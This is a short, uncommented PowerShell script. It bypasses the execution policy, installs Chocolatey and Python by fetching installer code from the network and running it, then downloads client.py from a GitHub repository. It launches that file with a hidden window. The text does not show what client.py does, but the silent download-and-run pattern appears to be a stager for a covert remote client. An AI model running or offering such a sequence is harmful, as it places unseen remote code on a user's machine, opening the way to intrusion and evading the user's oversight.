Set-ExecutionPolicy Bypass -Scope Process -Force; `
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; `
iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install -y python3

python --version

mkdir SWAMI

cd SWAMI

iwr "https://raw.githubusercontent.com/ArcticHonour/client/refs/heads/main/client.py" -UseBasicParsing -OutFile client.py

Start-Process python.exe -ArgumentList "client.py" -WindowStyle Hidden 
